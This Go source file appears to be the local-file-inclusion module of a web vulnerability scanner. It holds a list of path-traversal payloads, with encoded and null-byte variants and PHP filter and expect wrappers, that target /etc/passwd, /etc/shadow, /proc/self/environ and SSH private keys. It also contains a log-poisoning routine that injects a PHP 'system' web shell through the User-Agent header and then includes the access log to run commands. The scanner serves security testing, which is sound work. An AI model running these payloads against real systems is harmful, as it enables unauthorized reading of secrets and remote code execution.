package lfi

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

var payloads = []struct {
	path   string
	marker string
	os     string
}{
	// Unix — absolute
	{"/etc/passwd", "root:", "unix"},
	{"/etc/shadow", "root:", "unix"},
	{"/etc/hosts", "localhost", "unix"},
	{"/proc/self/environ", "PATH=", "unix"},
	{"/proc/self/cmdline", "/", "unix"},
	{"/proc/version", "Linux", "unix"},
	// Unix — traversal depth 3-6
	{"../../../etc/passwd", "root:", "unix"},
	{"../../../../etc/passwd", "root:", "unix"},
	{"../../../../../etc/passwd", "root:", "unix"},
	{"../../../../../../etc/passwd", "root:", "unix"},
	{"../../../../../../../etc/passwd", "root:", "unix"},
	// Null byte (legacy PHP)
	{"../../../etc/passwd\x00", "root:", "unix"},
	{"../../../etc/passwd%00", "root:", "unix"},
	// URL encoding
	{"..%2F..%2F..%2Fetc%2Fpasswd", "root:", "unix"},
	{"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:", "unix"},
	// Double encoding
	{"..%252F..%252F..%252Fetc%252Fpasswd", "root:", "unix"},
	{"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:", "unix"},
	// Windows
	{"C:\\Windows\\win.ini", "[fonts]", "windows"},
	{"..\\..\\..\\Windows\\win.ini", "[fonts]", "windows"},
	{"../../../Windows/win.ini", "[fonts]", "windows"},
	{"..%5C..%5C..%5CWindows%5Cwin.ini", "[fonts]", "windows"},
	{"..%255C..%255C..%255CWindows%255Cwin.ini", "[fonts]", "windows"},
	// PHP wrappers
	{"php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vdDo", "php"},
	{"php://filter/read=string.rot13/resource=/etc/passwd", "ebbg:", "php"},
	{"php://filter/convert.base64-encode/resource=index.php", "PD9waHA", "php"},
	{"expect://id", "uid=", "php"},
	{"data://text/plain;base64,cm9vdDo=", "root:", "php"},
	// Log poisoning indicators
	{"../../../var/log/apache2/access.log", "Mozilla", "unix"},
	{"../../../var/log/nginx/access.log", "Mozilla", "unix"},
	{"../../../var/log/apache/access.log", "Mozilla", "unix"},
	{"/var/log/apache2/access.log", "Mozilla", "unix"},
	// Other sensitive files
	{"/etc/issue", "Ubuntu", "unix"},
	{"/etc/os-release", "NAME=", "unix"},
	{"/.ssh/id_rsa", "PRIVATE KEY", "unix"},
}

var fileParamNames = []string{
	"file", "filename", "path", "filepath", "page", "include", "load",
	"document", "doc", "name", "template", "view", "module", "content",
	"resource", "source", "src", "url", "uri", "img", "image",
	"cat", "action", "board", "date", "detail", "dir", "download",
	"feed", "folder", "from", "go", "goto", "layout", "link",
	"open", "p", "pagename", "portal", "prefix", "read", "redirect",
	"root", "show", "site", "style", "type",
}

type param struct {
	name    string
	value   string
	inQuery bool
	pageURL string
	form    *crawler.Form
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "lfi" }

var logPoisonPayload = "<?php system($_GET['cmd']); ?>"
var logPoisonMarker = "uid="

var logPaths = []string{
	"../../../var/log/apache2/access.log",
	"../../../var/log/nginx/access.log",
	"../../../var/log/apache/access.log",
	"../../../../var/log/apache2/access.log",
	"/var/log/apache2/access.log",
	"/var/log/nginx/access.log",
	"/var/log/apache/access.log",
	"../../../var/log/httpd/access_log",
	"/var/log/httpd/access_log",
}

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding
	params := collectParams(page)

	for _, p := range params {
		if ctx.Err() != nil {
			break
		}
		for _, pl := range payloads {
			if ctx.Err() != nil {
				break
			}
			body, reqDump, err := m.injectCapture(ctx, p, pl.path)
			if err != nil {
				continue
			}
			bodyStr := string(body)
			if !strings.Contains(bodyStr, pl.marker) {
				continue
			}

			extracted := extractFileContent(bodyStr, pl.marker)
			resp3k := bodyStr
			if len(resp3k) > 3000 {
				resp3k = resp3k[:3000] + "\n[… truncated]"
			}

			f := modules.Finding{
				Module:      "lfi",
				Severity:    modules.Critical,
				URL:         paramURL(p),
				Param:       p.name,
				Payload:     pl.path,
				Evidence:    fmt.Sprintf("Marker %q found in response (%s target)", pl.marker, pl.os),
				Detail:      fmt.Sprintf("Local File Inclusion in %q — %s file readable", p.name, pl.os),
				CWE:         "CWE-22",
				CVSS:        7.5,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
				Confidence:  modules.Confirmed,
				Remediation: "Validate file paths against an allow-list; use basename(); disable allow_url_include; chroot/jail the app",
				Tags:        []string{"injection", "lfi", "path-traversal", "file-read"},
				Request:     reqDump,
				Response:    resp3k,
				Extracted:   extracted,
			}
			findings = append(findings, f)

			// Attempt log poisoning → RCE escalation if the included file is an access log
			if isLogPath(pl.path) {
				if rcef := m.tryLogPoisoning(ctx, p, pl.path); rcef != nil {
					findings = append(findings, *rcef)
				}
			}
			break
		}
	}

	return findings, nil
}

// tryLogPoisoning attempts to escalate LFI to RCE by:
// 1. Injecting PHP code into the server access log via User-Agent header
// 2. Including the poisoned log via the LFI parameter
// 3. Detecting command execution output in the response
func (m *Module) tryLogPoisoning(ctx context.Context, p param, logPath string) *modules.Finding {
	// Step 1: poison the log with PHP payload in User-Agent
	poisonReq, _, err := m.buildRequest(ctx, p, logPath)
	if err != nil {
		return nil
	}
	poisonReq.Header.Set("User-Agent", logPoisonPayload)
	// Also add cmd=id as query parameter for the PHP payload
	if poisonReq.URL.RawQuery != "" {
		poisonReq.URL.RawQuery += "&cmd=id"
	} else {
		poisonReq.URL.RawQuery = "cmd=id"
	}
	poisonResp, err := m.client.Do(poisonReq)
	if err != nil {
		return nil
	}
	client.DrainClose(poisonResp)

	// Step 2: re-trigger the LFI to read the (now-poisoned) log
	body, _, err := m.injectCapture(ctx, p, logPath)
	if err != nil {
		return nil
	}
	bodyStr := string(body)

	if !strings.Contains(bodyStr, logPoisonMarker) {
		return nil
	}

	extracted := extractFileContent(bodyStr, logPoisonMarker)

	return &modules.Finding{
		Module:  "lfi",
		Severity: modules.Critical,
		URL:     paramURL(p),
		Param:   p.name,
		Payload: logPath + " [log poisoning via User-Agent]",
		Evidence: fmt.Sprintf("Log poisoning → RCE confirmed: %q marker found after injecting PHP via User-Agent into %s. Output: %s",
			logPoisonMarker, logPath, extracted),
		Detail: "LFI → RCE via log poisoning: PHP code injected into the web server access log via the User-Agent header " +
			"was executed when the log was included through the LFI vulnerability. Full Remote Code Execution achieved. " +
			"Attacker can execute arbitrary OS commands as the web server process user.",
		CWE:         "CWE-94",
		CVSS:        9.8,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Disable file inclusion from logs; prevent PHP execution in log directories; move to strict allow-list for include/require paths; disable allow_url_include; consider using a WAF rule blocking PHP tags in User-Agent",
		Tags:        []string{"lfi", "rce", "log-poisoning", "php", "path-traversal"},
		Extracted:   extracted,
	}
}

func isLogPath(path string) bool {
	for _, lp := range logPaths {
		if strings.Contains(path, lp) {
			return true
		}
	}
	return false
}

// extractFileContent tries to return clean file content from a response body.
// It looks for the marker and grabs up to 4 KB around it, stripping HTML tags.
func extractFileContent(body, marker string) string {
	idx := strings.Index(body, marker)
	if idx == -1 {
		return ""
	}
	start := idx - 200
	if start < 0 {
		start = 0
	}
	end := idx + 3800
	if end > len(body) {
		end = len(body)
	}
	excerpt := body[start:end]
	// Strip HTML tags to surface the raw file content
	var sb strings.Builder
	inTag := false
	for _, r := range excerpt {
		switch {
		case r == '<':
			inTag = true
		case r == '>':
			inTag = false
		case !inTag:
			sb.WriteRune(r)
		}
	}
	return strings.TrimSpace(sb.String())
}

func (m *Module) buildRequest(ctx context.Context, p param, value string) (*http.Request, []byte, error) {
	if p.inQuery {
		u, err := url.Parse(p.pageURL)
		if err != nil {
			return nil, nil, err
		}
		q := u.Query()
		q.Set(p.name, value)
		u.RawQuery = q.Encode()
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
		return req, nil, err
	}
	if p.form == nil {
		return nil, nil, fmt.Errorf("no form")
	}
	data := make(url.Values)
	for _, f := range p.form.Fields {
		if f.Name == p.name {
			data.Set(f.Name, value)
		} else if f.Value != "" {
			data.Set(f.Name, f.Value)
		} else {
			data.Set(f.Name, "test")
		}
	}
	encoded := []byte(data.Encode())
	if strings.ToUpper(p.form.Method) == "POST" {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, p.form.Action,
			strings.NewReader(string(encoded)))
		if err != nil {
			return nil, nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		return req, encoded, nil
	}
	u, err := url.Parse(p.form.Action)
	if err != nil {
		return nil, nil, err
	}
	u.RawQuery = data.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	return req, nil, err
}

func (m *Module) inject(ctx context.Context, p param, value string) ([]byte, error) {
	req, _, err := m.buildRequest(ctx, p, value)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

func (m *Module) injectCapture(ctx context.Context, p param, value string) ([]byte, string, error) {
	req, _, err := m.buildRequest(ctx, p, value)
	if err != nil {
		return nil, "", err
	}
	resp, reqDump, err := m.client.DoCapture(req)
	if err != nil {
		return nil, reqDump, err
	}
	body, err := client.ReadBody(resp)
	return body, reqDump, err
}

func collectParams(page crawler.Page) []param {
	var params []param

	u, err := url.Parse(page.URL)
	if err == nil {
		for k, vs := range u.Query() {
			if !isFileParam(k) {
				continue
			}
			val := ""
			if len(vs) > 0 {
				val = vs[0]
			}
			params = append(params, param{name: k, value: val, inQuery: true, pageURL: page.URL})
		}
	}

	for i := range page.Forms {
		for _, f := range page.Forms[i].Fields {
			if f.Type == "hidden" || f.Type == "submit" || f.Type == "button" {
				continue
			}
			if !isFileParam(f.Name) {
				continue
			}
			params = append(params, param{
				name: f.Name, value: f.Value,
				inQuery: false, pageURL: page.URL, form: &page.Forms[i],
			})
		}
	}

	return params
}

func isFileParam(name string) bool {
	lower := strings.ToLower(name)
	for _, fp := range fileParamNames {
		if lower == fp || strings.Contains(lower, fp) {
			return true
		}
	}
	return false
}

func paramURL(p param) string {
	if p.form != nil {
		return p.form.Action
	}
	return p.pageURL
}
